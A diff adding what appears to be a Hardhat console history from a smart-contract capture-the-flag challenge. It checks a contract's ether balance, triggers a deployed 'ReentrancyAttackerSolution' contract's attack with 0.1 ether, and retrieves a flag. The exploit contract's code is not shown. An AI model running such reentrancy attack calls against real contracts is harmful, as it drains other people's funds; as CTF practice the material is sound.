@@ -1,0 +1,20 @@
+exit
+await attacker.vault();
+console.log("🎯 Flag:", flag);
+const flag = await attacker.getFlag();
+await attacker.attack({ value: ethers.utils.parseEther("0.1") });
+const attacker = await ethers.getContractAt("ReentrancyAttackerSolution", "0xe7E405E718Cda0C797f40d07A4D770ad71180799");
+// Display the result
+const formattedBalance = ethers.utils.formatEther(balance);
+// Format the balance using ethers v5 utils
+const balance = await ethers.provider.getBalance("0x73320556b6972c5794be23c9561b884ae0dd0127");
+// Get the balance (ethers v5 style)
+const { ethers } = require("hardhat");
+// Import ethers from hardhat
+const { ethers } = require("hardhat");
+ethers.formatEther(await ethers.provider.getBalance("0x73320556b6972c5794be23c9561b884ae0dd0127"))
+const { ethers } = require("hardhat");
+(await ethers.provider.getBalance("0x73320556b6972c5794be23c9561b884ae0dd0127")).toString()
+exit()
+exit
+(await ethers.getSigner()).address
